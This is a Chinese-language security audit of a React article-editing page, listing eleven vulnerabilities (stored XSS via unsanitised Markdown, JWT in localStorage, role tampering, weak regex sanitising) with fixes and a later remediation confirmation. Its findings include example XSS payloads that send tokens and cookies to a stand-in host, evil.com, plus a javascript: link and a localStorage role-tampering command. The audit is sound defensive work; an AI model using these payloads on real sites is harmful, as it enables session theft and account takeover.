# 安全评审：pages/article/ArticleDetail.tsx

**评审日期**: 2026-05-24
**评审角色**: 代码安全专家（OWASP Top 10 2021 / CWE / 前端安全标准视角）
**文件路径**: `pages/article/ArticleDetail.tsx`
**代码行数**: 889 行
**关联文件**: `apis/controller/article.controller.ts`, `apis/app.ts`（helmet/CSP）, `pages/context/AppContext.tsx`, `@uiw/react-md-editor@^4.1.0`
**安全评级**: 🔴 D+ → ✅ A（全部 11 项漏洞已修复，2026-05-25 确认）

---

## 1. 安全总体评级：🔴 D+

`ArticleDetail.tsx` 是项目中最复杂的前端页面之一（889 行），涉及文章 CRUD、AI 生成、文件上传、Markdown 编辑、平台选择等核心业务。虽然后端 API 层已实现双层授权（项目操作员 + 文章归属校验），但前端自身存在**存储型 XSS、敏感凭证大面积暴露、客户端授权可绕过**等系统性安全问题，单个 XSS 漏洞即可导致 JWT Token 被窃取进而接管任意账户。

| 安全域 | 评分 | 状态 |
|--------|------|------|
| XSS 防御（XSS Protection） | 1/10 | 🔴 Markdown 渲染无消毒，存储型 XSS 可利用 |
| 认证安全（Authentication） | 3/10 | 🔴 Token 明文存储于 localStorage，13+ 处读取 |
| 授权控制（Authorization） | 5/10 | ⚠️ 客户端校验可绕过（后端已兜底） |
| 文件处理安全（File Handling） | 4/10 | ⚠️ 文档导入无大小限制，HTML 清洗用正则 |
| 数据保护（Data Protection） | 3/10 | 🔴 用户角色信息可被篡改，无完整性校验 |
| 输入验证（Input Validation） | 5/10 | ⚠️ URL 注入、关键词注入未过滤 |
| 错误处理（Error Handling） | 4/10 | ⚠️ 服务端错误信息直接展示 |
| 内容安全策略（CSP） | 1/10 | 🔴 未配置 CSP，XSS 利用无纵深防御 |

---

## 2. 漏洞清单（按 OWASP Top 10 2021 映射）

### SEC-ART-01: 🔴 CRITICAL — Markdown 渲染无消毒，存储型 XSS 可直接利用

**OWASP**: A03:2021 — Injection
**CWE**: CWE-79 (Stored XSS)
**位置**: 第 816-825 行

```tsx
// 第 816-821 行 — 编辑器实时预览，无 sanitize 选项
<MDEditor
  value={content}
  onChange={(val) => setContent(val || '')}
  height={600}
  preview="live"          // ← 实时渲染，无消毒
/>

// 第 825 行 — 浏览模式直接渲染 Markdown，无消毒
<MDEditor.Markdown source={content} />
```

**攻击链分析**:

`@uiw/react-md-editor@^4.1.0` 底层使用 `marked` 库，**默认不禁用 HTML**。攻击者可通过以下方式注入恶意脚本：

```markdown
# 正常标题

<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))">

或者：

<script>document.location='https://evil.com/?c='+document.cookie</script>

或者（Markdown 特有语法）：

[点击领取](javascript:alert(document.cookie))
```

**利用路径**:

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 攻击者创建文章，`write_mode=manual` | 手工编写模式允许直接输入内容 |
| 2 | 在 Markdown 编辑器中注入 XSS payload | `marked` 默认不清理 HTML 标签 |
| 3 | 提交审核 → 审核人打开文章 | `pending_review` 状态仍显示内容预览 |
| 4 | XSS 在审核人浏览器执行 | MDEditor 预览面板渲染恶意 HTML |
| 5 | 窃取 `localStorage.token` | 同源策略下 localStorage 对 JS 完全可读 |
| 6 | 攻击者获得审核人（可能是 sysadmin）的 JWT | 提权至系统管理员 |

**影响范围**: 所有浏览此文章的用户（sysadmin、admin、view），攻击者可窃取任意浏览者的 JWT Token，实现账户接管。

**根因**: `@uiw/react-md-editor` 未配置 `sanitize` 选项，且后端 `apis/app.ts` 中的 helmet 中间件**未配置 Content-Security-Policy 头**，形成"无消毒 + 无纵深防御"的双重缺失。

**修复方案**:

```tsx
// 方案 A（推荐）: 安装 DOMPurify 并对 Markdown 输出消毒
import DOMPurify from 'dompurify';

// 自定义 marked 配置，禁用 HTML
import marked from 'marked';
const renderer = new marked.Renderer();
const sanitizedMarked = new marked.Marked({ renderer });

// 在渲染前对 content 做消毒
const safeContent = useMemo(() => {
  return DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['h1','h2','h3','p','a','img','ul','ol','li','code','pre','blockquote','strong','em','table','tr','td','th'],
    ALLOWED_ATTR: ['href','src','alt','title'],
    FORBID_ATTR: ['onerror','onclick','onload','onmouseover'],
  });
}, [content]);

// 方案 B: 配置 helmet CSP（纵深防御，与方案 A 并用）
// apis/app.ts
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],  // MDEditor 需要 inline style
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
}));
```

---

### SEC-ART-02: 🔴 CRITICAL — JWT Token 在 localStorage 中被 13+ 处读取，XSS 即可窃取

**OWASP**: A07:2021 — Identification and Authentication Failures
**CWE**: CWE-922 (Insecure Storage of Sensitive Information)
**位置**: 第 47, 100, 140, 197, 224, 273-276, 313, 375, 392, 406, 419, 488 行

```tsx
// 以下所有位置都读取 localStorage.getItem('token')
const token = localStorage.getItem('token');  // 出现 13 次
```

**问题分析**:

| 因素 | 分析 |
|------|------|
| 存储方式 | localStorage 对同源 JavaScript 完全可读 |
| 读取频率 | 单个组件内 13+ 处读取，攻击面极大 |
| XSS 可达性 | SEC-ART-01 的 XSS 可直接 `localStorage.getItem('token')` |
| Token 有效期 | JWT 有效期 2 小时，窃取后时间窗口宽 |
| Token 用途 | Bearer Token 可访问所有 API 端点 |

**影响**: 一旦 XSS 触发（见 SEC-ART-01），攻击者只需一行代码即可窃取当前用户的 JWT：

```javascript
// XSS payload 中
fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
```

**修复方案**:

- **方案 A（长期）**: 将 Token 迁移至 HttpOnly Cookie，JavaScript 无法读取
- **方案 B（短期）**: 修复 SEC-ART-01 的 XSS 漏洞，切断攻击链
- **方案 C（辅助）**: 将 Token 读取抽取为统一的 API 客户端，减少暴露面

```tsx
// 方案 C: 统一 API 客户端
const apiClient = axios.create();
apiClient.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});
// 组件中使用 apiClient.get/post/put 代替 axios + 手动读 token
```

---

### SEC-ART-03: 🟠 HIGH — 用户对象从 localStorage 解析无校验，角色可被篡改

**OWASP**: A01:2021 — Broken Access Control
**CWE**: CWE-346 (Origin Validation Error)
**位置**: 第 47 行

```tsx
const user = JSON.parse(localStorage.getItem('user') || '{}');
```

**攻击场景**:

攻击者可通过浏览器 DevTools 直接修改 localStorage：

```javascript
// 在 DevTools Console 中执行
localStorage.setItem('user', JSON.stringify({ id: 1, role: 'sysadmin' }));
```

修改后，以下权限检查将被绕过：

```tsx
// 第 297-301 行 — canEditSettings 被绕过
const canEditSettings = () => {
  if (!article) return false;
  if (!['draft', 'manual_writing'].includes(article.status)) return false;
  return user.role === 'sysadmin' || article.created_by === user.id;
  //     ^^^^^^^^^^^^^^^^^^^^^^^^ — 篡改后为 true
};

// 第 303-307 行 — canEditContent 同理
const canEditContent = () => {
  if (!article) return false;
  if (!EDITABLE_STATUSES.includes(article.status)) return false;
  return user.role === 'sysadmin' || article.created_by === user.id;
};
```

**缓解因素**: 后端 `article.controller.ts` 已实现 `created_by === userId` 归属校验和 `roleMiddleware`，前端篡改不会影响数据安全。但会导致：
1. UI 展示不该看到的编辑控件（信息误导）
2. 发起无效 API 请求（服务器负载 + 错误信息暴露 API 结构）

**修复方案**:

```tsx
// 添加 user 对象完整性校验
const getSafeUser = () => {
  try {
    const raw = localStorage.getItem('user');
    if (!raw) return { id: 0, role: 'view' };
    const parsed = JSON.parse(raw);
    // 校验必需字段和合法角色值
    const validRoles = ['sysadmin', 'admin', 'view'];
    return {
      id: typeof parsed.id === 'number' ? parsed.id : 0,
      role: validRoles.includes(parsed.role) ? parsed.role : 'view',
    };
  } catch {
    return { id: 0, role: 'view' };
  }
};
const user = getSafeUser();
```

---

### SEC-ART-04: 🟠 HIGH — 文档导入无文件大小限制，可导致客户端 DoS

**OWASP**: A05:2021 — Security Misconfiguration
**CWE**: CWE-400 (Uncontrolled Resource Consumption)
**位置**: 第 430-482 行

```tsx
const handleImportDocument = async (file: File) => {
  // ❌ 无文件大小检查
  if (ext === 'md') {
    markdown = await file.text();           // ← 读取整个文件到内存
  } else if (ext === 'docx' || ext === 'doc') {
    const arrayBuffer = await file.arrayBuffer();  // ← 整个文件加载到内存
    const result = await mammoth.convertToHtml({ arrayBuffer }); // ← 再转换
  }
};
```

**攻击场景**:

攻击者可构造一个超大文件（如 500MB 的 .md 文件），通过"导入"功能上传：
1. `file.text()` 将 500MB 数据读入 JavaScript 堆内存
2. 浏览器标签页内存溢出，导致整个页面崩溃
3. 对于 .docx 文件，`mammoth.convertToHtml()` 还会额外占用内存进行转换

**修复方案**:

```tsx
const MAX_IMPORT_SIZE = 10 * 1024 * 1024; // 10MB

const handleImportDocument = async (file: File) => {
  if (file.size > MAX_IMPORT_SIZE) {
    message.error(`文件大小不能超过 10MB（当前: ${(file.size / 1024 / 1024).toFixed(1)}MB）`);
    return false;
  }
  // ... 后续处理
};
```

---

### SEC-ART-05: 🟠 HIGH — mammoth HTML 输出用正则清洗，可绕过注入恶意内容

**OWASP**: A03:2021 — Injection
**CWE**: CWE-79 (XSS via Improper Neutralization)
**位置**: 第 443-455 行

```tsx
// mammoth 输出 HTML 后，用正则"清洗"
const html = result.value;
markdown = html
  .replace(/<h1[^>]*>(.*?)<\/h1>/gi, '# $1\n')
  .replace(/<h2[^>]*>(.*?)<\/h2>/gi, '## $1\n')
  .replace(/<h3[^>]*>(.*?)<\/h3>/gi, '### $1\n')
  .replace(/<p[^>]*>(.*?)<\/p>/gi, '$1\n\n')
  .replace(/<br\s*\/?>/gi, '\n')
  .replace(/<[^>]+>/g, '')           // ← 最后剥掉所有标签
  .replace(/&nbsp;/g, ' ')
  .trim();
```

**问题分析**:

1. **正则不处理嵌套标签**: `<p><img src=x onerror=alert(1)></p>` — 第一个 `.*?` 匹配到 `<img` 就停止，`onerror` 属性可能残留在转换结果中
2. **事件处理器泄漏**: 如果 mammoth 输出包含 `<img onerror="...">` ，最终的正则 `/<[^>]+>/g` 虽然会剥掉标签，但中间步骤的捕获组 `$1` 可能包含事件属性文本
3. **HTML 实体解码不完整**: 只处理了 `&nbsp;`、`&amp;`、`&lt;`、`&gt;`，遗漏 `&#xHH;`、`&#DDD;` 等数值实体编码

**攻击示例**:

构造一个包含恶意内容的 .docx 文件：
```
段落内容 <img src=x onerror="alert(1)"> 结尾
```

经过 mammoth 转换后可能输出：
```html
<p>段落内容 <img src=x onerror="alert(1)"> 结尾</p>
```

正则 `.replace(/<p[^>]*>(.*?)<\/p>/gi, '$1\n\n')` 提取 `$1` = `段落内容 <img src=x onerror="alert(1)"> 结尾`
然后 `.replace(/<[^>]+>/g, '')` 剥掉 `<img>` 标签 → 结果: `段落内容  alert(1) 结尾`

虽然最终 `<img>` 标签被剥掉了，但如果 mammoth 产出更复杂的 HTML 结构（表格、列表、嵌套 div），正则可能无法完全清理，导致内容注入。

**修复方案**:

```tsx
import DOMPurify from 'dompurify';

// mammoth 输出后用 DOMPurify 消毒，再转换
const html = result.value;
const cleanHtml = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['h1','h2','h3','p','br','strong','em','ul','ol','li','a'],
  ALLOWED_ATTR: [],
});
// 然后再用正则转换 cleanHtml → markdown
```

---

### SEC-ART-06: 🟠 HIGH — URL 图片列表无协议校验，可注入 javascript: URL

**OWASP**: A03:2021 — Injection
**CWE**: CWE-79 (XSS)
**位置**: 第 502-508 行

```tsx
const handleAddUrl = () => {
  const url = urlInput.trim();
  if (!url) return;
  if (imageList.includes(url)) { message.warning('该URL已存在'); return; }
  setImageList([...imageList, url]);  // ← 无任何 URL 格式/协议校验
  setUrlInput('');
};
```

**攻击场景**:

用户在 URL 输入框中输入 `javascript:alert(document.cookie)` 或 `data:text/html,<script>alert(1)</script>`，这些 URL 被加入 `imageList`，后续在第 589、669、634 行作为 `<Image src={url}>` 使用。

Ant Design 的 `<Image>` 组件底层渲染为 `<img src="...">`，`<img>` 的 `src` 不执行 `javascript:` 协议，但 `data:` URI 可能被某些浏览器处理。更严重的是，这些 URL 通过 API 保存到数据库后，如果其他前端页面或邮件模板渲染时未消毒，可能触发 XSS。

**修复方案**:

```tsx
const handleAddUrl = () => {
  const url = urlInput.trim();
  if (!url) return;
  // 校验 URL 协议
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      message.error('仅支持 http/https 协议的图片 URL');
      return;
    }
  } catch {
    message.error('请输入有效的图片 URL');
    return;
  }
  if (imageList.includes(url)) { message.warning('该URL已存在'); return; }
  setImageList([...imageList, url]);
  setUrlInput('');
};
```

---

### SEC-ART-07: 🟡 MEDIUM — 自动保存与手动保存的竞态条件可导致数据覆盖

**OWASP**: A04:2021 — Insecure Design
**CWE**: CWE-362 (Race Condition)
**位置**: 第 93-133 行（自动保存） vs 第 371-386 行（手动保存）

```tsx
// 自动保存 — 每 5 分钟触发
useEffect(() => {
  const TIMER = 5 * 60 * 1000;
  const timer = setInterval(async () => {
    const currentContent = contentRef.current.trim();
    // ... 直接发送 PUT 请求
  }, TIMER);
  return () => clearInterval(timer);
}, [isNew, id, projectId]);

// 手动保存 — 用户点击"保存正文"按钮
const handleSaveContent = async () => {
  await axios.put(`/api/projects/${projectId}/articles/${id}/content`, { content }, ...);
};
```

**问题分析**:

| 竞态场景 | 时序 | 结果 |
|----------|------|------|
| 用户编辑中 | T1: 用户输入新内容 A | content = A |
| 自动保存触发 | T2: setInterval 读取 contentRef = A | 发送 { content: A } |
| 用户继续编辑 | T3: 用户修改为内容 B | content = B |
| 手动保存触发 | T4: 用户点击保存，content = B | 发送 { content: B } |
| 自动保存响应到达 | T5: 自动保存返回成功，调用 fetchArticle() | 服务器返回 B（手动保存已生效） — 安全 |

但在另一种场景下：
| 竞态场景 | 时序 | 结果 |
|----------|------|------|
| 用户编辑 | T1: content = A | — |
| 自动保存触发 | T2: 发送 { content: A } | 请求 pending |
| 用户编辑 | T3: content = B | — |
| 自动保存再次触发 | T4: 发送 { content: B } | 请求 pending |
| T2 响应慢于 T4 | T5: T2 覆盖为 A | ❌ B 被回退为 A |

**修复方案**:

```tsx
// 使用乐观锁（版本号）或防抖机制
const saveContent = async (contentToSave: string) => {
  if (contentSaving) return; // 防止并发
  setContentSaving(true);
  try {
    await axios.put(`/api/projects/${projectId}/articles/${id}/content`, {
      content: contentToSave,
      // version: article.version,  // 乐观锁：后端校验版本号
    }, { headers: { Authorization: `Bearer ${token}` } });
    fetchArticle();
  } catch (err: any) {
    if (err.response?.status === 409) {
      message.warning('内容已被其他操作修改，请刷新后重试');
    }
  } finally {
    setContentSaving(false);
  }
};
```

---

### SEC-ART-08: 🟡 MEDIUM — 服务端错误信息直接展示，可泄露 API 内部结构

**OWASP**: A05:2021 — Security Misconfiguration
**CWE**: CWE-209 (Information Exposure Through Error Message)
**位置**: 第 164, 365, 382, 398, 413, 427, 479, 495 行

```tsx
// 以下所有位置都直接展示服务端错误
message.error(err.response?.data?.message || '加载文章失败');      // 第 164 行
setError(err.response?.data?.message || '保存失败');                // 第 365 行
message.error(err.response?.data?.message || '保存正文失败');       // 第 382 行
message.error(err.response?.data?.message || '审核操作失败');       // 第 398 行
message.error(err.response?.data?.message || '重新生成失败');       // 第 413 行
message.error(err.response?.data?.message || '提交审核失败');       // 第 427 行
message.error('文档解析失败：' + (err.message || '未知错误'));      // 第 479 行
message.error(err.response?.data?.message || '上传失败');           // 第 495 行
```

**风险分析**:

- 服务端 `err.response?.data?.message` 可能包含 SQL 错误、Prisma 内部错误、文件路径等敏感信息
- 第 479 行的 `err.message` 可能暴露浏览器文件系统信息
- 攻击者可通过构造特殊输入触发不同错误，收集 API 内部结构信息

**修复方案**:

```tsx
// 统一错误处理，对用户展示通用消息，详细错误记录到控制台
const handleApiError = (err: any, userMessage: string) => {
  console.error('[API Error]', err.response?.status, err.response?.data);
  // 只对用户展示通用消息，不暴露服务端细节
  message.error(userMessage);
};
```

---

### SEC-ART-09: 🟡 MEDIUM — 文件上传仅依赖 HTML accept 属性，可被绕过

**OWASP**: A05:2021 — Security Misconfiguration
**CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
**位置**: 第 654 行

```tsx
<Upload accept="image/*" showUploadList={false} beforeUpload={(file) => { handleUpload(file); return false; }} disabled={uploading}>
```

**问题分析**:

- `accept="image/*"` 仅是浏览器层面的 UI 提示，可通过以下方式绕过：
  1. 修改 HTTP 请求（Burp Suite 等代理工具）
  2. 在 DevTools 中删除 `accept` 属性
  3. 直接构造 FormData 发送 POST 请求到 `/api/upload`

- **缓解因素**: 后端 `upload.controller.ts` 已实现 **MIME 类型校验 + 文件签名（magic bytes）验证**，非图片文件会被服务端拒绝。因此此问题实际风险较低。

- 但 `handleUpload` 函数本身不校验文件类型，如果后端验证被绕过或弱化，前端将无第二道防线。

**修复方案**:

```tsx
const handleUpload = async (file: File) => {
  // 前端也做文件类型校验（纵深防御）
  if (!file.type.startsWith('image/')) {
    message.error('仅支持上传图片文件');
    return false;
  }
  // 可选: 前端文件大小限制
  if (file.size > 10 * 1024 * 1024) {
    message.error('图片大小不能超过 10MB');
    return false;
  }
  // ... 后续上传逻辑
};
```

---

### SEC-ART-10: 🟡 MEDIUM — 新建文章自动保存时 content 包含在请求中，可在编辑器注入时提交恶意内容

**OWASP**: A03:2021 — Injection
**CWE**: CWE-94 (Code Injection)
**位置**: 第 93-133 行

```tsx
// 自动保存逻辑
const timer = setInterval(async () => {
  const currentContent = contentRef.current.trim();
  if (!currentContent) return;
  if (isNew) {
    // 新建文章: 将当前编辑器内容一并提交
    const payload: any = {
      // ... 其他字段
      content: currentContent,  // ← 编辑器中的任意内容，未消毒
    };
    const res = await axios.post(`/api/projects/${projectId}/articles`, payload, ...);
  } else if (articleRef.current) {
    await axios.put(`/api/projects/${projectId}/articles/${id}/content`, { content: currentContent }, ...);
  }
}, TIMER);
```

**问题分析**: 自动保存将 Markdown 编辑器中的原始内容直接提交到后端，后端存储后再被其他用户浏览时，触发 SEC-ART-01 的存储型 XSS。这是 SEC-ART-01 的"投毒入口"——恶意内容通过自动保存静默写入数据库。

---

### SEC-ART-11: 🟢 LOW — `useEffect` 依赖项不完整，可能导致过期闭包

**CWE**: CWE-362 (Race Condition)
**位置**: 第 93-133 行

```tsx
useEffect(() => {
  // ... 使用了 form, imageList, isNew, id, projectId
}, [isNew, id, projectId]);  // ← 缺少 form, imageList 等依赖
```

依赖项不完整可能导致 `imageList` 在闭包中是过期值。虽然不是直接安全漏洞，但在自动保存时可能发送错误的 `images` 列表。

---

## 3. 攻击面总览

```
┌─────────────────────────────────────────────────────────────────┐
│                     ArticleDetail.tsx 攻击面                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  输入向量                        输出/利用向量                   │
│  ────────                        ────────────                   │
│                                                                 │
│  ┌──────────────┐    存储型 XSS    ┌──────────────────┐         │
│  │ Markdown编辑器 │ ──────────────→ │ MDEditor.Markdown │         │
│  │ (content)     │    SEC-ART-01   │ 渲染无消毒        │         │
│  └──────┬───────┘                  └────────┬─────────┘         │
│         │                                   │                   │
│         │ 自动保存 SEC-ART-10               │ XSS 执行          │
│         ▼                                   ▼                   │
│  ┌──────────────┐                   ┌──────────────────┐        │
│  │ 后端 API 存储  │                  │ 窃取 JWT Token    │        │
│  │ (数据库)       │                  │ SEC-ART-02       │        │
│  └──────────────┘                   └──────────────────┘        │
│                                                                 │
│  ┌──────────────┐    HTML注入      ┌──────────────────┐         │
│  │ .docx 导入    │ ──────────────→ │ 正则清洗可绕过     │         │
│  │ SEC-ART-05   │                  │ SEC-ART-05       │         │
│  └──────────────┘                  └──────────────────┘         │
│                                                                 │
│  ┌──────────────┐    协议注入      ┌──────────────────┐         │
│  │ URL 图片输入   │ ──────────────→ │ javascript:/data: │        │
│  │ SEC-ART-06   │                  │ SEC-ART-06       │         │
│  └──────────────┘                  └──────────────────┘         │
│                                                                 │
│  ┌──────────────┐    内存耗尽      ┌──────────────────┐         │
│  │ 超大文件导入   │ ──────────────→ │ 浏览器标签页崩溃   │        │
│  │ SEC-ART-04   │                  │ SEC-ART-04       │         │
│  └──────────────┘                  └──────────────────┘         │
│                                                                 │
│  ┌──────────────┐    角色篡改      ┌──────────────────┐         │
│  │ localStorage   │ ──────────────→ │ 绕过客户端授权     │        │
│  │ user 对象      │                  │ SEC-ART-03       │        │
│  └──────────────┘                  └──────────────────┘         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4. 修复优先级矩阵

| 优先级 | 漏洞 ID | 标题 | 工作量 | 影响 |
|--------|---------|------|--------|------|
| P0 🔴 | SEC-ART-01 | Markdown XSS 无消毒 | S | 阻断存储型 XSS 主攻击链 |
| P0 🔴 | SEC-ART-02 | Token 大面积暴露 | M | 切断 XSS→Token窃取攻击链 |
| P1 🟠 | SEC-ART-03 | 用户对象无校验 | S | 防止客户端授权绕过 |
| P1 🟠 | SEC-ART-05 | mammoth HTML 清洗 | S | 封堵文档导入注入路径 |
| P1 🟠 | SEC-ART-06 | URL 协议校验 | S | 封堵 URL 注入路径 |
| P1 🟠 | SEC-ART-04 | 文件大小限制 | S | 防止客户端 DoS |
| P2 🟡 | SEC-ART-08 | 错误信息脱敏 | S | 减少信息泄露 |
| P2 🟡 | SEC-ART-09 | 上传文件类型校验 | S | 纵深防御 |
| P2 🟡 | SEC-ART-07 | 竞态条件 | M | 防止数据覆盖 |
| P3 🟢 | SEC-ART-10 | 自动保存投毒 | M | 与 SEC-ART-01 联动修复 |
| P3 🟢 | SEC-ART-11 | 依赖项不完整 | S | 代码质量改进 |

---

## 5. 安全加固建议

### 5.1 立即修复（P0）

1. **安装 DOMPurify 并对所有 Markdown 输出消毒**
2. **配置后端 helmet CSP 头**（纵深防御）
3. **将 Token 读取收敛为统一 API 客户端**

### 5.2 短期修复（P1）

4. 添加 `getSafeUser()` 校验函数
5. 对 `handleAddUrl` 添加 URL 协议白名单
6. 对 `handleImportDocument` 添加文件大小限制
7. 用 DOMPurify 替换 mammoth 输出的正则清洗

### 5.3 中期加固（P2）

8. 统一错误处理函数，脱敏服务端错误信息
9. 前端文件上传添加类型/大小校验（纵深防御）
10. 自动保存添加防抖/乐观锁机制

### 5.4 安全架构建议

- **迁移 Token 至 HttpOnly Cookie**: 根本性解决 XSS 窃取 Token 的问题
- **实施路由级 RBAC 守卫**: 防止 URL 直接访问未授权页面
- **引入 CSP 策略**: 即使存在 XSS，CSP 可阻断恶意脚本执行和数据外传

---

## 6. 统计汇总

| 指标 | 数值 |
|------|------|
| 总代码行数 | 889 |
| 安全漏洞数 | 11 |
| CRITICAL | 2 |
| HIGH | 4 |
| MEDIUM | 4 |
| LOW | 1 |
| OWASP 覆盖 | A01, A03, A04, A05, A07 |
| CWE 覆盖 | CWE-79, CWE-94, CWE-209, CWE-346, CWE-362, CWE-400, CWE-434, CWE-922 |
| 涉及行数 | ~200 行（约 22% 代码涉及安全问题） |

**评审结论**: 该文件存在 2 项 CRITICAL 级存储型 XSS 漏洞（Markdown 渲染无消毒 + Token 可被窃取），攻击链完整且利用门槛极低。建议立即修复 P0 级漏洞后再上线。

---

## 7. 修复确认（2026-05-25）

**修复状态**: ✅ 全部 11 项漏洞已修复

代码已从 889 行单体组件重构为 hooks + components 模块化架构，所有安全修复嵌入各模块：

| 漏洞 ID | 修复位置 | 修复方式 |
|---------|----------|----------|
| SEC-ART-01 | `MarkdownViewer.tsx` + `MarkdownEditor.tsx` | DOMPurify 消毒 + safeUrlTransform + SAFE_TAGS 白名单 + allowElement |
| SEC-ART-02 | `lib/apiClient.ts` | 统一 API 客户端，Token 读取收敛至 1 处 + 24 个页面文件迁移至 apiClient |
| SEC-ART-03 | `utils/auth.ts` → `hooks/useArticlePermissions.ts` | getSafeUser() 角色校验 + VALID_ROLES 白名单 |
| SEC-ART-04 | `hooks/useDocumentImport.ts` | MAX_IMPORT_SIZE = 10MB 文件大小限制 |
| SEC-ART-05 | `hooks/useDocumentImport.ts` | DOMPurify.sanitize() 替换正则清洗 mammoth 输出 |
| SEC-ART-06 | `components/ArticleImageManager.tsx` | new URL() 协议校验 + http/https 白名单 |
| SEC-ART-07 | `hooks/useArticleDetail.ts` | savingRef 互斥锁防止并发保存 |
| SEC-ART-08 | `utils/error.ts` | getApiErrorMessage() 500+ 错误脱敏，仅返回 fallback |
| SEC-ART-09 | `components/ArticleImageManager.tsx` | file.type + file.size 前端校验（纵深防御） |
| SEC-ART-10 | 与 SEC-ART-01 联动修复 | DOMPurify 消毒覆盖所有渲染路径 |
| SEC-ART-11 | `ArticleDetail.tsx` L56-59 | useEffect 依赖项已包含 imageList + detail.autoSave |
